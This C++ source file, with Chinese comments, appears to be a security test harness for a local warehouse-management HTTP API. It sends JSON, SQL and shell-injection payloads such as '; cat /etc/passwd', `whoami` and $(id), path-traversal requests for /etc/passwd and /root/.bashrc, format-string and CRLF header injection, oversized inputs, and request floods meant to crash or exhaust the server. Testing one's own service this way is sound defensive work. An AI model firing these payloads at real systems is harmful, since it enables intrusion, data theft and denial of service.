/*
 * 安全攻击测试程序
 * 目标：发现并利用C++11仓库管理系统的安全漏洞
 * 编译：g++ -std=c++11 -o security_attack_test security_attack_test.cpp -pthread
 * 运行：./security_attack_test
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

class SecurityAttackTest {
private:
    std::string server_host;
    int server_port;
    
public:
    SecurityAttackTest(const std::string& host = "127.0.0.1", int port = 8080) 
        : server_host(host), server_port(port) {}
    
    // 发送HTTP请求并返回响应
    std::string sendHttpRequest(const std::string& request) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return "SOCKET_ERROR";
        }
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            return "CONNECTION_ERROR";
        }
        
        send(sock, request.c_str(), request.length(), 0);
        
        char buffer[65536];
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        close(sock);
        
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            return std::string(buffer);
        }
        
        return "NO_RESPONSE";
    }
    
    // 攻击1：JSON注入攻击
    void jsonInjectionAttacks() {
        std::cout << "\n=== JSON注入攻击测试 ===" << std::endl;
        
        std::vector<std::string> malicious_payloads = {
            // 尝试破坏JSON结构
            R"({"trans_id":"test","item_id":"malicious\","injection":"here","type":"in","quantity":1})",
            
            // 超长字符串攻击
            R"({"trans_id":")" + std::string(100000, 'A') + R"(","item_id":"test","type":"in","quantity":1})",
            
            // 特殊字符攻击
            R"({"trans_id":"<script>alert('XSS')</script>","item_id":"test","type":"in","quantity":1})",
            R"({"trans_id":"'; DROP TABLE transactions; --","item_id":"test","type":"in","quantity":1})",
            R"({"trans_id":"\u0000\u0001\u0002\u0003","item_id":"test","type":"in","quantity":1})",
            
            // 数字溢出攻击
            R"({"trans_id":"test","item_id":"test","type":"in","quantity":2147483648})",
            R"({"trans_id":"test","item_id":"test","type":"in","quantity":-2147483649})",
            
            // 嵌套攻击
            R"({"trans_id":{"nested":"object"},"item_id":"test","type":"in","quantity":1})",
            
            // Unicode攻击
            R"({"trans_id":"\\u0041\\u0042","item_id":"test","type":"in","quantity":1})",
            
            // 格式错误
            R"({malformed json})",
            R"({"trans_id":"test","item_id":"test","type":"in","quantity":})",
        };
        
        for (size_t i = 0; i < malicious_payloads.size(); ++i) {
            std::cout << "攻击 " << i + 1 << ": ";
            
            std::string request = 
                "POST /api/managers/test_manager/transactions HTTP/1.1\r\n"
                "Host: " + server_host + "\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: " + std::to_string(malicious_payloads[i].length()) + "\r\n"
                "\r\n" + malicious_payloads[i];
            
            std::string response = sendHttpRequest(request);
            
            if (response.find("500") != std::string::npos) {
                std::cout << "🔴 服务器崩溃！" << std::endl;
            } else if (response.find("200") != std::string::npos) {
                std::cout << "🟡 接受了恶意输入" << std::endl;
            } else if (response.find("400") != std::string::npos) {
                std::cout << "🟢 正确拒绝" << std::endl;
            } else {
                std::cout << "🔵 未知响应: " << response.substr(0, 50) << std::endl;
            }
        }
    }
    
    // 攻击2：缓冲区溢出攻击
    void bufferOverflowAttacks() {
        std::cout << "\n=== 缓冲区溢出攻击测试 ===" << std::endl;
        
        // 巨大的HTTP头攻击
        std::cout << "攻击1: 超长HTTP头" << std::endl;
        std::string huge_header = "X-Evil-Header: " + std::string(100000, 'A') + "\r\n";
        std::string request1 = 
            "GET /api/managers/test/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n" +
            huge_header +
            "\r\n";
        
        std::string response1 = sendHttpRequest(request1);
        analyzeResponse("超长HTTP头", response1);
        
        // 巨大的URL攻击
        std::cout << "攻击2: 超长URL路径" << std::endl;
        std::string huge_path = "/api/managers/" + std::string(50000, 'A') + "/transactions";
        std::string request2 = 
            "GET " + huge_path + " HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "\r\n";
        
        std::string response2 = sendHttpRequest(request2);
        analyzeResponse("超长URL路径", response2);
        
        // 巨大的POST body攻击
        std::cout << "攻击3: 超大POST body" << std::endl;
        std::string huge_body = R"({"trans_id":"test","item_id":")" + std::string(1000000, 'X') + R"(","type":"in","quantity":1})";
        std::string request3 = 
            "POST /api/managers/test/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: " + std::to_string(huge_body.length()) + "\r\n"
            "\r\n" + huge_body;
        
        std::string response3 = sendHttpRequest(request3);
        analyzeResponse("超大POST body", response3);
    }
    
    // 攻击3：内存耗尽攻击
    void memoryExhaustionAttacks() {
        std::cout << "\n=== 内存耗尽攻击测试 ===" << std::endl;
        
        // 大量并发连接
        std::cout << "攻击1: 大量并发连接" << std::endl;
        std::vector<std::thread> threads;
        
        for (int i = 0; i < 100; ++i) {
            threads.emplace_back([this, i]() {
                for (int j = 0; j < 10; ++j) {
                    std::string manager_id = "flood_manager_" + std::to_string(i);
                    std::string json_body = R"({"trans_id":"flood_)" + std::to_string(i * 10 + j) + 
                                          R"(","item_id":"flood_item","type":"in","quantity":1})";
                    
                    std::string request = 
                        "POST /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                        "Host: " + server_host + "\r\n"
                        "Content-Type: application/json\r\n"
                        "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                        "\r\n" + json_body;
                    
                    sendHttpRequest(request);
                }
            });
        }
        
        for (auto& t : threads) {
            t.join();
        }
        std::cout << "完成1000个并发交易请求" << std::endl;
        
        // 内存炸弹攻击
        std::cout << "攻击2: 内存炸弹" << std::endl;
        for (int i = 0; i < 100; ++i) {
            std::string manager_id = "bomb_manager_" + std::to_string(i);
            
            // 每个管理员创建大量交易记录
            for (int j = 0; j < 100; ++j) {
                std::string json_body = R"({"trans_id":"bomb_)" + std::to_string(i * 100 + j) + 
                                      R"(","item_id":")" + std::string(1000, 'B') + 
                                      R"(","item_name":")" + std::string(1000, 'N') + 
                                      R"(","type":"in","quantity":1000,"note":")" + std::string(2000, 'Z') + R"("})";
                
                std::string request = 
                    "POST /api/managers/" + manager_id + "/transactions HTTP/1.1\r\n"
                    "Host: " + server_host + "\r\n"
                    "Content-Type: application/json\r\n"
                    "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                    "\r\n" + json_body;
                
                sendHttpRequest(request);
            }
        }
        std::cout << "完成内存炸弹攻击：10000个大体积交易记录" << std::endl;
    }
    
    // 攻击4：路径遍历攻击
    void pathTraversalAttacks() {
        std::cout << "\n=== 路径遍历攻击测试 ===" << std::endl;
        
        std::vector<std::string> malicious_paths = {
            "/api/managers/../../../etc/passwd/transactions",
            "/api/managers/..%2F..%2F..%2Fetc%2Fpasswd/transactions",
            "/api/managers/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd/transactions",
            "/api/managers/....//....//....//etc/passwd/transactions",
            "/api/managers/test/../../../root/.bashrc/transactions",
            "/api/managers/test/../../../../proc/version/transactions",
        };
        
        for (size_t i = 0; i < malicious_paths.size(); ++i) {
            std::cout << "攻击 " << i + 1 << ": ";
            
            std::string request = 
                "GET " + malicious_paths[i] + " HTTP/1.1\r\n"
                "Host: " + server_host + "\r\n"
                "\r\n";
            
            std::string response = sendHttpRequest(request);
            
            if (response.find("root:") != std::string::npos || 
                response.find("Linux version") != std::string::npos) {
                std::cout << "🔴 路径遍历成功！泄露系统信息" << std::endl;
            } else if (response.find("404") != std::string::npos) {
                std::cout << "🟢 正确处理" << std::endl;
            } else {
                std::cout << "🔵 其他响应" << std::endl;
            }
        }
    }
    
    // 攻击5：代码注入攻击
    void codeInjectionAttacks() {
        std::cout << "\n=== 代码注入攻击测试 ===" << std::endl;
        
        std::vector<std::string> injection_payloads = {
            // C++代码注入尝试
            R"({"trans_id":"test\"; system(\"ls -la\"); //","item_id":"test","type":"in","quantity":1})",
            R"({"trans_id":"test'; system('whoami'); //","item_id":"test","type":"in","quantity":1})",
            
            // 格式化字符串攻击
            R"({"trans_id":"%x%x%x%x%x","item_id":"test","type":"in","quantity":1})",
            R"({"trans_id":"%n%n%n%n","item_id":"test","type":"in","quantity":1})",
            
            // Shell注入尝试
            R"({"trans_id":"test; cat /etc/passwd","item_id":"test","type":"in","quantity":1})",
            R"({"trans_id":"test`whoami`","item_id":"test","type":"in","quantity":1})",
            R"({"trans_id":"test$(id)","item_id":"test","type":"in","quantity":1})",
            
            // HTTP头注入
            "test\r\nX-Injected-Header: malicious\r\n",
        };
        
        for (size_t i = 0; i < injection_payloads.size() - 1; ++i) {
            std::cout << "攻击 " << i + 1 << ": ";
            
            std::string request = 
                "POST /api/managers/test_manager/transactions HTTP/1.1\r\n"
                "Host: " + server_host + "\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: " + std::to_string(injection_payloads[i].length()) + "\r\n"
                "\r\n" + injection_payloads[i];
            
            std::string response = sendHttpRequest(request);
            analyzeCodeInjectionResponse(response);
        }
        
        // HTTP头注入攻击
        std::cout << "攻击8: HTTP头注入" << std::endl;
        std::string request = 
            "GET /api/managers/" + injection_payloads.back() + "/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "\r\n";
        
        std::string response = sendHttpRequest(request);
        if (response.find("X-Injected-Header") != std::string::npos) {
            std::cout << "🔴 HTTP头注入成功！" << std::endl;
        } else {
            std::cout << "🟢 头注入被阻止" << std::endl;
        }
    }
    
    // 攻击6：竞态条件攻击
    void raceConditionAttacks() {
        std::cout << "\n=== 竞态条件攻击测试 ===" << std::endl;
        
        // 并发写入相同管理员
        std::cout << "攻击1: 并发写入竞态条件" << std::endl;
        std::vector<std::thread> threads;
        
        for (int i = 0; i < 50; ++i) {
            threads.emplace_back([this, i]() {
                std::string json_body = R"({"trans_id":"race_)" + std::to_string(i) + 
                                      R"(","item_id":"race_item","type":"in","quantity":1})";
                
                std::string request = 
                    "POST /api/managers/race_manager/transactions HTTP/1.1\r\n"
                    "Host: " + server_host + "\r\n"
                    "Content-Type: application/json\r\n"
                    "Content-Length: " + std::to_string(json_body.length()) + "\r\n"
                    "\r\n" + json_body;
                
                sendHttpRequest(request);
            });
        }
        
        for (auto& t : threads) {
            t.join();
        }
        
        // 检查数据一致性
        std::string check_request = 
            "GET /api/managers/race_manager/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "\r\n";
        
        std::string response = sendHttpRequest(check_request);
        int transaction_count = countJsonObjects(response);
        
        std::cout << "并发写入完成，实际记录数: " << transaction_count << std::endl;
        if (transaction_count != 50) {
            std::cout << "🔴 数据一致性问题！期望50个记录，实际" << transaction_count << "个" << std::endl;
        } else {
            std::cout << "🟢 数据一致性正常" << std::endl;
        }
    }
    
    // 攻击7：HTTP协议攻击
    void httpProtocolAttacks() {
        std::cout << "\n=== HTTP协议攻击测试 ===" << std::endl;
        
        // HTTP请求拆分攻击
        std::cout << "攻击1: HTTP请求拆分" << std::endl;
        std::string split_request = 
            "GET /api/managers/test/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "\r\n"
            "GET /api/managers/evil/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "\r\n";
        
        std::string response1 = sendHttpRequest(split_request);
        analyzeResponse("HTTP请求拆分", response1);
        
        // 畸形HTTP版本
        std::cout << "攻击2: 畸形HTTP版本" << std::endl;
        std::string malformed_version = 
            "GET /api/managers/test/transactions HTTP/999.999\r\n"
            "Host: " + server_host + "\r\n"
            "\r\n";
        
        std::string response2 = sendHttpRequest(malformed_version);
        analyzeResponse("畸形HTTP版本", response2);
        
        // 超长HTTP方法
        std::cout << "攻击3: 超长HTTP方法" << std::endl;
        std::string long_method = 
            std::string(10000, 'A') + " /api/managers/test/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "\r\n";
        
        std::string response3 = sendHttpRequest(long_method);
        analyzeResponse("超长HTTP方法", response3);
    }
    
    // 辅助分析函数
    void analyzeResponse(const std::string& attack_name, const std::string& response) {
        if (response == "CONNECTION_ERROR") {
            std::cout << "🔴 连接错误 - 可能导致服务器崩溃" << std::endl;
        } else if (response == "NO_RESPONSE") {
            std::cout << "🔴 无响应 - 可能导致服务器挂起" << std::endl;
        } else if (response.find("500") != std::string::npos) {
            std::cout << "🔴 服务器内部错误" << std::endl;
        } else if (response.find("400") != std::string::npos) {
            std::cout << "🟢 正确拒绝请求" << std::endl;
        } else {
            std::cout << "🔵 其他响应" << std::endl;
        }
    }
    
    void analyzeCodeInjectionResponse(const std::string& response) {
        if (response.find("uid=") != std::string::npos || 
            response.find("root") != std::string::npos ||
            response.find("bash") != std::string::npos) {
            std::cout << "🔴 代码注入成功！" << std::endl;
        } else if (response.find("500") != std::string::npos) {
            std::cout << "🟡 服务器错误" << std::endl;
        } else {
            std::cout << "🟢 注入被阻止" << std::endl;
        }
    }
    
    int countJsonObjects(const std::string& response) {
        int count = 0;
        size_t pos = 0;
        while ((pos = response.find("trans_id", pos)) != std::string::npos) {
            count++;
            pos++;
        }
        return count;
    }
    
    // 运行所有攻击测试
    void runAllAttacks() {
        std::cout << "🔥 开始安全攻击测试 - 目标服务器: " << server_host << ":" << server_port << std::endl;
        std::cout << "⚠️  警告：这些测试可能会导致服务器不稳定或崩溃！" << std::endl;
        
        jsonInjectionAttacks();
        bufferOverflowAttacks();
        memoryExhaustionAttacks();
        pathTraversalAttacks();
        codeInjectionAttacks();
        raceConditionAttacks();
        httpProtocolAttacks();
        
        std::cout << "\n🏁 所有安全攻击测试完成" << std::endl;
        std::cout << "请检查服务器日志以查看详细的安全事件" << std::endl;
    }
};

int main() {
    SecurityAttackTest test;
    test.runAllAttacks();
    return 0;
}